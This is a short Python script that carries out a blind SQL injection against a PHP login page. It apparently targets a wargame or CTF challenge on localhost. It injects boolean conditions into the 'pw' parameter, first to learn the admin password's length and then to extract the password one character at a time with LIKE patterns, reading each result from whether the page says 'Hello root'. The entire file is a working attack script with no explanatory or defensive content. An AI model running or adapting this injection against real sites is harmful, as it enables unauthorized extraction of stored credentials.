import requests

pw_Length = 0
pw = ""

#url = "http://192.168.110.229/index.php"
url = "http://127.0.0.1:8100/index.php"

# Found Admin PW Length mysql if(condition, true, false)
for i in range(1,20):
    params = {
        "pw":"' || if(length(pw)>%d,1,0) && id like 'root" % i
    }

    print "[Try Find Admin PW Length] : %d " % i
    res = requests.get(url, params=params)

    if "Hello root" not in res.content:
        pw_Length = i
        print "admin PW Length: %d" % i
        break

# Found Admin PW :
for i in range(1,(pw_Length+1)):
    for j in range(0x20, 0x7f):
        if (j==0x3d) or (j == 0x27) or (j== 0x22) or (j==0x25) or (j==0x21) or (j==0x23):  
            continue
        a = pw+chr(j)+"%"
        
        params = {
            "pw":"' || pw like '%s' && id like 'root" % a
        }
        print "[Try index :%d, %c]" % (i,j)
        
        try:
            res = requests.get(url, params=params)
        
        except Exception as e:
            j=j-1
            continue

        if "Hello root" in res.content:
            print "Found It!! index: %d, %c" % (i,j)
            pw = pw+chr(j)
            print "[pw: %s]" % pw
            break

print "password:",pw.lower()
